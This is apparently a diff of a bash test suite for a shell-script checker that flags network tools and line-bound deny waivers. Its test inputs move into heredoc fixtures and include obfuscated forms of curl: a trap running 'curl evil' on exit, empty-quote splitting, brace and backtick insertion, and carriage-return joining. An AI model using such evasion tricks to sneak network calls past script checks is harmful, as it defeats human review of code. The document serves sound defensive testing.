 am t2_evil 'bash bin/witnessed.sh build evil' caught 'arg_map'
 am t2_quote 'bash bin/witnessed.sh apk "bin/stage-apk.sh"' caught 'arg_map'
 am t2_dot 'bash bin/witnessed.sh apk ./bin/stage-apk.sh' caught 'arg_map'
@@ -3166,11 +3333,47 @@ dl lb_b 'git status' '[D("git status")]' ok -
 dl lb_c 'git status\ngit status' '[D("git status")]' caught 'count'
 dl lb_d 'git status\ngit status' '[D("git status", 2)]' ok -
 dl lb_e 'git status' '[D("git status", 2)]' caught 'count'
-dl lb_f "trap 'curl evil' EXIT\ncu\"\"rl x" '[D("cu\"\"rl x")]' caught "'curl'" '["trap"]'
-for form in 'curl"$x" x' 'x=1 curl"$e" x' 'curl{,} x' 'curl`true` x'; do
-  dl "lb_q_$RANDOM" "$form\necho ok" '[D("echo ok")]' caught "'curl'"
+cat > "$FXDIR/FXD_12" <<'FXEOF'
+trap 'curl evil' EXIT\ncu""rl x
+FXEOF
+FXD_12=$(cat "$FXDIR/FXD_12")
+cat > "$FXDIR/FXD_11" <<'FXEOF'
+'curl'
+FXEOF
+FXD_11=$(cat "$FXDIR/FXD_11")
+dl lb_f "$FXD_12" '[D("cu\"\"rl x")]' caught "$FXD_11" '["trap"]'
+cat > "$FXDIR/FXD_10" <<'FXEOF'
+curl"$x" x
+FXEOF
+FXD_10=$(cat "$FXDIR/FXD_10")
+cat > "$FXDIR/FXD_9" <<'FXEOF'
+x=1 curl"$e" x
+FXEOF
+FXD_9=$(cat "$FXDIR/FXD_9")
+cat > "$FXDIR/FXD_8" <<'FXEOF'
+curl{,} x
+FXEOF
+FXD_8=$(cat "$FXDIR/FXD_8")
+cat > "$FXDIR/FXD_7" <<'FXEOF'
+curl`true` x
+FXEOF
+FXD_7=$(cat "$FXDIR/FXD_7")
+cat > "$FXDIR/FXD_6" <<'FXEOF'
+'curl'
+FXEOF
+FXD_6=$(cat "$FXDIR/FXD_6")
+for form in "$FXD_10" "$FXD_9" "$FXD_8" "$FXD_7"; do
+  dl "lb_q_$RANDOM" "$form\necho ok" '[D("echo ok")]' caught "$FXD_6"
 done
-dl lb_g 'curl a' '[D("curl a")]' ok - '[]'
+cat > "$FXDIR/FXD_5" <<'FXEOF'
+curl a
+FXEOF
+FXD_5=$(cat "$FXDIR/FXD_5")
+cat > "$FXDIR/FXD_4" <<'FXEOF'
+[D("curl a")]
+FXEOF
+FXD_4=$(cat "$FXDIR/FXD_4")
+dl lb_g "$FXD_5" "$FXD_4" ok - '[]'
 dl lb_i 'git status' '[D("git stat")]' caught 'stale'
 dl lb_j 'git status' '[dict(D("git status"), line_sha256="0"*64)]' caught 'sha256'
 dl lb_k 'git status' '[{"rule":"deny","text":"git status","why":"x"}]' caught 'line-bound'
@@ -3194,9 +3397,17 @@ dl lb_zc 'git -c core.sshCommand=x fetch' '[D("git -c core.sshCommand=x fetch")]
 d=$(wfix lb_zd); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"].append(D("set -euo pipefail"))'; expm caught "$d" 'waives nothing' "line-bound: a deny entry for a line with no deny finding waives nothing (an error)"
 # a carriage return anywhere is refused (the files are written as bytes)
 crf() { local d; d=$(cfix "$1" 'echo a'); printf '%b' "$2" > "$d/bin/c.sh"; edit_spec "$d" 'rows["bin/c.sh"]["tools"]=[]'; echo "$d"; }
-d=$(crf cr_a '#!/usr/bin/env bash\nset -euo pipefail\necho x\\\r\ncurl x\n'); expm caught "$d" 'carriage return' "line-bound: echo x\\<CR><LF>curl x is refused (bash does not join it)"
+cat > "$FXDIR/FXD_3" <<'FXEOF'
+line-bound: echo x\<CR><LF>curl x is refused (bash does not join it)
+FXEOF
+FXD_3=$(cat "$FXDIR/FXD_3")
+d=$(crf cr_a '#!/usr/bin/env bash\nset -euo pipefail\necho x\\\r\ncurl x\n'); expm caught "$d" 'carriage return' "$FXD_3"
 d=$(crf cr_b '#!/usr/bin/env bash\necho a\r\n'); expm caught "$d" 'carriage return' "line-bound: any script with a CR is refused"
-d=$(crf cr_c '#!/usr/bin/env bash\ncurl a\r\n'); edit_spec "$d" "$DEF"'rows["bin/c.sh"]["exceptions"]=[D("curl a\r")]'; expm caught "$d" 'carriage return' "line-bound: no waiver applies to a script with a CR"
+cat > "$FXDIR/FXD_2" <<'FXEOF'
+rows["bin/c.sh"]["exceptions"]=[D("curl a\r")]
+FXEOF
+FXD_2=$(cat "$FXDIR/FXD_2")
+d=$(crf cr_c '#!/usr/bin/env bash\ncurl a\r\n'); edit_spec "$d" "$DEF""$FXD_2"; expm caught "$d" 'carriage return' "line-bound: no waiver applies to a script with a CR"
 d=$(crf cr_ok '#!/usr/bin/env bash\necho a\n'); expm ok "$d" - "line-bound: control: the same script without a CR"
 # strip_line reads a script as bash does (REQ-CHAIN-001-AC1, REQ-CHAIN-003-AC3; advisor Oct 17, reproduced by a reviewer): a # line inside a quote that is still
 # open from an earlier line is part of the quoted word, never a comment, and an ANSI-C quote $'..' ends at the first quote that is not backslash-escaped. The judge
@@ -3434,7 +3645,11 @@ dl lc_l 'tar -I sh x f' '[D("tar -I sh x f")]' ok - '["tar"]'
 dl lc_m '# git is only documented here' '[]' caught "'git'"
 dl lc_n '# git is only documented here' '[D("# git is only documented here")]' ok -
 dl lc_o 'git -c core.sshCommand=x \\\n  fetch' '[D("git -c core.sshCommand=x \\")]' caught 'program-running option' '["git"]'
-d=$(crf cr_d '#!/usr/bin/env bash\ncurl a\necho b\r\n'); edit_spec "$d" "$DEF"'rows["bin/c.sh"]["exceptions"]=[D("curl a")]'; expm caught "$d" 'carriage return' "line-bound: a valid ASCII entry with a CR on another line of the script: no waiver applies"
+cat > "$FXDIR/FXD_1" <<'FXEOF'
+rows["bin/c.sh"]["exceptions"]=[D("curl a")]
+FXEOF
+FXD_1=$(cat "$FXDIR/FXD_1")
+d=$(crf cr_d '#!/usr/bin/env bash\ncurl a\necho b\r\n'); edit_spec "$d" "$DEF""$FXD_1"; expm caught "$d" 'carriage return' "line-bound: a valid ASCII entry with a CR on another line of the script: no waiver applies"
 cat > "$work/loadcr.py" <<'PY'
 import importlib.util, os, sys
 spec = importlib.util.spec_from_file_location("cts", os.environ["CHAIN_ROOT"] + "/bin/chain-test-signers.py"); cts = importlib.util.module_from_spec(spec); spec.loader.exec_module(cts)
